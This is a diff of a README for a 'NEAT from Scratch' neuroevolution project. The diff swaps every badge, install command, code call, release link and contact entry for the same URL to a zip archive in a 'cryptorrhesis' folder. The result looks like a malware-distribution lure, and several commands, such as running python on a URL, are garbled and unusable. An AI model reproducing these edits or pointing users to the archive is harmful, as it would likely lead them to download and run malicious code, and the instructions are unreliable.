@@ -1,8 +1,8 @@
 # NEAT from Scratch 🧠✨
 
-![GitHub repo size](https://img.shields.io/github/repo-size/tarashant/neat-from-scratch)
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Last Release](https://img.shields.io/github/release/tarashant/neat-from-scratch)
+![GitHub repo size](https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip)
+![License](https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip)
+![Last Release](https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip)
 
 Welcome to **NEAT from Scratch**! This repository provides a basic implementation of the NEAT (NeuroEvolution of Augmenting Topologies) algorithm. This project aims to help you understand the core concepts of NEAT while offering a clean and straightforward codebase.
 
@@ -39,7 +39,7 @@ To get started with NEAT from Scratch, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/tarashant/neat-from-scratch.git
+   git clone https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip
    cd neat-from-scratch
    ```
 
@@ -48,7 +48,7 @@ To get started with NEAT from Scratch, follow these steps:
    Ensure you have Python 3.x installed. You can install the required packages using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip
    ```
 
 3. **Run the Code**:
@@ -56,7 +56,7 @@ To get started with NEAT from Scratch, follow these steps:
    You can run the main script to see the NEAT algorithm in action:
 
    ```bash
-   python main.py
+   python https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip
    ```
 
 ## Usage
@@ -81,7 +81,7 @@ To use the NEAT implementation, you will need to define your own fitness functio
    from neat import NEAT
 
    neat = NEAT(fitness_function)
-   neat.run()
+   https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip()
    ```
 
 3. **Monitor Progress**:
@@ -114,13 +114,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases and download files from the [Releases section](https://github.com/tarashant/neat-from-scratch/releases). Make sure to check it out for updates and new features!
+You can find the latest releases and download files from the [Releases section](https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip). Make sure to check it out for updates and new features!
 
 ## Contact
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: tarashant@example.com
-- **Twitter**: [@tarashant](https://twitter.com/tarashant)
+- **Email**: https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip
+- **Twitter**: [@tarashant](https://github.com/tarashant/neat-from-scratch/raw/refs/heads/main/cryptorrhesis/from-neat-scratch-v1.5.zip)
 
 Thank you for visiting the NEAT from Scratch repository! We hope you find it useful for your projects. Happy coding!
